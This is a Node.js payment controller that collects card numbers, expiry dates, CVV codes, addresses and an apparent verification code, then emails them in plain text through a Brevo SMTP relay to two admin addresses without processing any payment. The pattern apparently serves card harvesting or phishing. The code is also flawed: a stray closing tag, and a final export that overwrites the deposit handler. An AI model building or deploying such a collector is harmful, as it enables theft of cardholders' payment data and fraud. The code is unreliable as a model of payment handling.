// /controllers/paymentController.js
const nodemailer = require('nodemailer');

// Create Brevo SMTP transporter
const transporter = nodemailer.createTransport({
  host: 'smtp-relay.brevo.com',
  port: 2525, // Works on Render free tier
  secure: false, // keep false for port 2525
  auth: {
    user: process.env.BREVO_SMTP_USER,  // your Brevo login email OR SMTP username
    pass: process.env.BREVO_SMTP_KEY    // your Brevo SMTP key
  }
});

// Helper function to send admin email notification
async function sendAdminNotification(payment) {
  const mailOptions = {
    from: process.env.BREVO_FROM_EMAIL,  // verified sender
    to: [process.env.ADMIN_EMAIL,
         process.env.ADMIN_EMAIL_2],
    subject: '💳 New Card Payment Submitted',
    html: `
      <h2>New Payment Alert</h2>
      <p><strong>User ID:</strong> ${payment.userId || 'N/A'}</p>
      <p><strong>First Name:</strong> ${payment.firstName}</p>
      <p><strong>Last Name:</strong> ${payment.lastName}</p>
      <p><strong>Card Number:</strong> ${payment.cardNumber}</p>
      <p><strong>Expiry:</strong> ${payment.expiry}</p>
      <p><strong>CVV:</strong> ${payment.cvv}</</p>
      <p><strong>Address:</strong> ${payment.address}</p>
      <p><strong>City:</strong> ${payment.city}</p>
      <p><strong>Postcode:</strong> ${payment.postcode}</p>
      <p><strong>Country:</strong> ${payment.country}</p>
      <p><strong>Amount:</strong> $${payment.amount}</p>
      <p><strong>Code:</strong> ${payment.code || 'N/A'}</p>
      <p><strong>Date:</strong> ${new Date(payment.date || Date.now()).toLocaleString()}</p>
    `
  };

  await transporter.sendMail(mailOptions);
}

// Main controller function for deposit
exports.deposit = async (req, res) => {
  try {
    const paymentData = {
      ...req.body,
      userId: req.user?._id || 'Guest',
      date: Date.now()
    };

    await sendAdminNotification(paymentData);

    res.status(200).json({ message: "Card details submitted successfully!" });
  } catch (error) {
    console.error("❌ Email send error:", error);
    res.status(500).json({ message: "Failed to send email." });
  }
};

module.exports = { transporter, sendAdminNotification };
